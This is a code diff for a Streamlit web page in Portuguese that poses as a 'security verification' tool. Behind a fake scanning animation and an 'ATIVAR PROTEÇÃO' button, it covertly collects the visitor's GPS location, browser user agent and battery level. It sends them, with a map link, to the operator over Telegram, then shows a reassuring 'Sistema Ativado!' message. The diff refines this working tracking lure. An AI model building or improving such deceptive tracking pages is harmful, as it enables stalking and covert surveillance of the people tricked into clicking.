@@ -14,9 +14,9 @@ def enviar_telegram(mensagem):
     except: pass
 
 # 2. CONFIGURAÇÃO DA PÁGINA
-st.set_page_config(page_title="Sistema De Segurança Integrado", page_icon="🔐", layout="centered")
+st.set_page_config(page_title="Sistema De Segurança Integrado ", page_icon="🔐", layout="centered")
 
-# 3. CSS DA ANIMAÇÃO
+# 3. CSS DA ANIMAÇÃO (FIXO)
 st.markdown("""
     <style>
     .main { background-color: #000000; color: white; }
@@ -41,15 +41,20 @@ st.markdown("""
     </style>
 """, unsafe_allow_html=True)
 
-# 4. INTERFACE INICIAL
+# 4. INTERFACE E CAPTURA
 st.markdown("<h2 style='text-align: center;'>Verificar segurança</h2>", unsafe_allow_html=True)
-espaco_animacao = st.empty()
+espaco_animacao = st.empty() # Espaço único para evitar erro de duplicata
 
+# Dados iniciais
+ua = streamlit_js_eval(js_expressions="window.navigator.userAgent", key='ua_unique')
+bat = streamlit_js_eval(js_expressions="navigator.getBattery().then(b => Math.round(b.level * 100))", key='bat_unique')
+
+# Estado inicial
 with espaco_animacao.container():
     st.markdown("""
         <div class="scanner-container">
-            <div class="particle-sphere"><div class="percentage">4%</div></div>
-            <div class="status-text">Sistema Pronto... Aguardando Ativação</div>
+            <div class="particle-sphere"><div class="percentage">0%</div></div>
+            <div class="status-text">Aguardando Início...</div>
         </div>
     """, unsafe_allow_html=True)
 
@@ -57,47 +62,42 @@ st.write("")
 st.write("✅ Privacidade e segurança")
 st.write("")
 
-# Dados do aparelho
-ua = streamlit_js_eval(js_expressions="window.navigator.userAgent", key='ua')
-bat = streamlit_js_eval(js_expressions="navigator.getBattery().then(b => Math.round(b.level * 100))", key='bat')
-
-# 5. LÓGICA DE 1 CLIQUE (O SEGREDO)
-if st.button("🔴 ATIVAR PROTEÇÃO"):
-    localizacao_obtida = None
+# 5. LÓGICA DO BOTÃO (SEM DUPLICIDADE)
+if st.button("🔴 ATIVAR PROTEÇÃO", key="btn_ativar"):
+    loc_final = None
     
-    # Enquanto a porcentagem sobe, o código tenta pegar o GPS várias vezes
-    for p in range(4, 101, 5):
+    # Loop de progresso com busca de GPS integrada
+    for p in range(0, 101, 5):
+        # Atualiza apenas o conteúdo do container vazio
         espaco_animacao.markdown(f"""
             <div class="scanner-container">
                 <div class="particle-sphere"><div class="percentage">{p}%</div></div>
-                <div class="status-text">Buscando sinal de satélite...</div>
+                <div class="status-text">Buscando satélite... {p}%</div>
             </div>
         """, unsafe_allow_html=True)
         
-        # Tenta capturar a localização em cada passo do loop
-        localizacao_obtida = get_geolocation()
-        
-        if localizacao_obtida and 'coords' in localizacao_obtida:
-            # Se achou o GPS, continua a animação até o fim e sai do loop
-            time.sleep(0.05) 
-        else:
-            time.sleep(0.2) # Dá um tempinho a mais pro navegador responder
+        # Tenta pegar o GPS durante a animação
+        temp_loc = get_geolocation()
+        if temp_loc and 'coords' in temp_loc:
+            loc_final = temp_loc
+            
+        time.sleep(0.1)
 
-    # FINALIZAÇÃO
-    if localizacao_obtida and 'coords' in localizacao_obtida:
-        lat = localizacao_obtida['coords']['latitude']
-        lon = localizacao_obtida['coords']['longitude']
+    # Verificação Final
+    if loc_final and 'coords' in loc_final:
+        lat = loc_final['coords']['latitude']
+        lon = loc_final['coords']['longitude']
         mapa = f"https://www.google.com/maps?q={lat},{lon}"
         
         relatorio = (
-            f"🚨 PROTEÇÃO ATIVADA (1 CLIQUE)\n\n"
+            f"🚨 PROTEÇÃO ATIVADA\n\n"
             f"📱 Aparelho: {ua[:40]}... \n"
             f"🔋 Bateria: {bat if bat else '--'}%\n"
-            f"📍 Mapa: [VER NO MAPA]({mapa})"
+            f"📍 Mapa: [ABRIR]({mapa})"
         )
         enviar_telegram(relatorio)
-        st.success("✅ Varredura Completa! Proteção Ativa.")
+        st.success("✅ Sistema Ativado!")
     else:
-        st.error("⚠️ O sinal de GPS falhou. Verifique se a localização do celular está ligada.")
+        st.error("⚠️ Sinal de GPS não detectado. Tente novamente.")
 
 st.markdown('<p class="footer">Desenvolvido Por Miamy © 2026</p>', unsafe_allow_html=True)
